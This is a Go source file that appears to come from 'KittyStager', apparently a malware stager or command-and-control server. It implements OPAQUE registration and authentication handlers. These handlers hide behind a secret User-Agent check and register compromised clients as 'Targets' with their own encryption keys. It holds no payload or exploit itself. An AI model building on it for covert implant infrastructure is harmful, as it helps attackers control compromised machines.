package http

import (
	"KittyStager/cmd/crypto"
	"KittyStager/cmd/util"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/frekui/opaque"
	color "github.com/logrusorgru/aurora"
	"io"
	"net/http"
)

var currentUser string
var session1 *opaque.PwRegServerSession
var session2 *opaque.AuthServerSession

// regHandler1 is the first step of the OPAQUE registration protocol
func regHandler1(w http.ResponseWriter, r *http.Request) {
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	data1, err := io.ReadAll(r.Body)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	var msg1 opaque.PwRegMsg1
	if err := json.Unmarshal(data1, &msg1); err != nil {
		util.ErrPrint(err)
		return
	}
	var msg2 opaque.PwRegMsg2
	session1, msg2, err = opaque.PwReg1(PrivS, msg1)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	data2, err := json.Marshal(msg2)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	_, err = w.Write(data2)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// regHandler2 is the second step of the OPAQUE registration protocol
func regHandler2(w http.ResponseWriter, r *http.Request) {
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	data3, err := io.ReadAll(r.Body)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	var msg3 opaque.PwRegMsg3
	if err := json.Unmarshal(data3, &msg3); err != nil {
		util.ErrPrint(err)
		return
	}
	user := opaque.PwReg3(session1, msg3)
	_, err = w.Write([]byte("ok"))
	if err != nil {
		util.ErrPrint(err)
		return
	}
	fmt.Printf("\n%s %s\n", color.Green("[+] Opaque registration request for user :"), color.Yellow(user.Username))
	Targets[user.Username] = &Kitten{
		Name:   user.Username,
		Opaque: user,
	}
	currentUser = user.Username
}

// authHandler1 is the first step of the OPAQUE authentication protocol
func authHandler1(w http.ResponseWriter, r *http.Request) {
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	data1, err := io.ReadAll(r.Body)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	var msg1 opaque.AuthMsg1
	if err := json.Unmarshal(data1, &msg1); err != nil {
		return
	}

	fmt.Printf("%s %s\n", color.Green("[+] Opaque authentication request for user :"), color.Yellow(msg1.Username))

	_, ok := Targets[msg1.Username]
	if !ok {
		fmt.Println("No such user")
		return
	}
	user := Targets[msg1.Username].Opaque
	var msg2 opaque.AuthMsg2
	session2, msg2, err = opaque.Auth1(PrivS, user, msg1)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	data2, err := json.Marshal(msg2)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	_, err = w.Write(data2)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// authHandler2 is the second step of the OPAQUE authentication protocol
func authHandler2(w http.ResponseWriter, r *http.Request) {
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	data3, err := io.ReadAll(r.Body)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	var msg3 opaque.AuthMsg3
	if err := json.Unmarshal(data3, &msg3); err != nil {
		return
	}
	sharedSecret, err := opaque.Auth3(session2, msg3)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	_, err = w.Write([]byte("ok"))
	if err != nil {
		util.ErrPrint(err)
		return
	}
	key := sharedSecret[:16]
	keyB64 := base64.StdEncoding.EncodeToString(key)
	// generate a 32 byte key
	key32 := crypto.GenerateKey(keyB64, 32)
	fmt.Printf("%s %s\n", color.Green("[+] Opaque key :"), color.Yellow(keyB64))
	Targets[currentUser].SetKey(key32)
}
